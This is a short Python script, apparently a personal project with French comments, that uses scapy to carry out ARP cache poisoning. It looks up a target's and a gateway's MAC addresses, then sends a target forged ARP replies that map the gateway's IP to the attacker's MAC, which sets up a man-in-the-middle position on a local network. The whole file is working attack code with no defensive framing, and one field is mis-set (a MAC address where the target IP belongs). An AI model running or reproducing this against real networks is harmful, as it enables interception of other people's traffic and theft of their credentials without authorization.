#! /usr/bin/python3
import logging
import time

from args import argument
from scapy.arch import get_if_hwaddr
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
from scapy.sendrecv import srp


MY_MAC = get_if_hwaddr('enp7s0')  # NOTE recupere mon MAC de l'interface


def get_mac(gateway: str = None, target: str = None):
    """Function that returns the mac address of the given ip address.

    Args:
        gateway (str, optional): gateway ip. Defaults to None.
        target (str, optional): target ip. Defaults to None.

    Returns:
        str: mac to ip.
    """
    
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gateway)

    if target:
        pkt['ARP'].pdst = target

    resp, _ = srp(pkt, timeout=1, verbose=False, retry=10)
    for _, r in resp:
        return r.hwsrc


def poising(target_mac: str, gateway_ip: str = '192.168.0.1', loop: int = 10, sleep: int | float = 1.51):
    """Function target arp table poisoning

    Args:
        target_mac (str): target mac for poising arp table
        gateway_ip (str, optional): ip gateway. Defaults to '192.168.0.1'.
        loop (int, optional): number send packet . Defaults to 10.
        sleep (int, optional): time to sleep between each request. Defaults to 1.51.
    """

    pkt = Ether(dst=target_mac) / ARP(psrc=gateway_ip,
                                      hwsrc=MY_MAC, op='is-at', pdst=target_mac)
    pkt.show()
    for _ in range(loop):
        time.sleep(sleep)
        srp(pkt, timeout=5, verbose=False)


if __name__ == '__main__':

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    arg = argument()
    ip_target = arg.target
    ip_gateway = arg.gateway

    mac_addr_gateway = get_mac(ip_gateway)
    mac_addr_target = get_mac(target=ip_target)

    print(f'Adresse mac target: {mac_addr_target}')
    print(f'Adresse mac gateway: {mac_addr_gateway}')

    poising(mac_addr_target, loop=100)
